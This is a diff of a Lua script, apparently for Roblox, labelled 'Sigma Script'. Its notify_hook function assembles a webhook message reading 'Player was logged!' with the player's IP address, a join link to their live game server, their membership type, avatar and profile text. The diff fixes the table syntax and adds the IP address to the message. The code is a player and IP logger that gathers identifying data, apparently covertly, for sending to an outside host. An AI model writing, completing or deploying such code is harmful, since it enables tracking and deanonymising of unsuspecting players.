@@ -25,11 +25,11 @@ local function notify_hook()
 	local send_data = {
   ["content"]="",
   ["tts"]= false,
-  ["embeds"= [
+  ["embeds"]= {
     {
       ["id"]= 985364321,
       ["title"]= "Player was logged!",
-      ["description"]= "IP : \nJoin: [**Click me!**](https://www.roblox.com/games/start?placeId="..game.PlaceId.."&jobId=".. game.JobId .. ")\n\nMembership : **".. player.MembershipType.Name .."**\n",
+      ["description"]= "IP : "..result.query.."\nJoin: [**Click me!**](https://www.roblox.com/games/start?placeId="..game.PlaceId.."&jobId=".. game.JobId .. ")\n\nMembership : **".. player.MembershipType.Name .."**\n",
       ["timestamp"]= "2025-10-08T21:00:00.000Z",
       ["color"]= 16777215,
       ["footer"]= {
@@ -44,17 +44,17 @@ local function notify_hook()
       ["image"]= {
         ["url"]= Avatar
       },
-      ["fields"]= [
+      ["fields"]= {
         {
           ["id"]= 845422695,
           ["name"]= "Profile Description",
-          ["value"]= ""..DescriptionData.."",
+          ["value"]= DescriptionData,
           ["inline"]= true
         }
-      ]
+	  }
     }
-  ],
-  ["components"]= [],
+  },
+  ["components"]= {},
   ["actions"]= {},
   ["flags"]= 0,
   ["username"]= "Sigma Script",
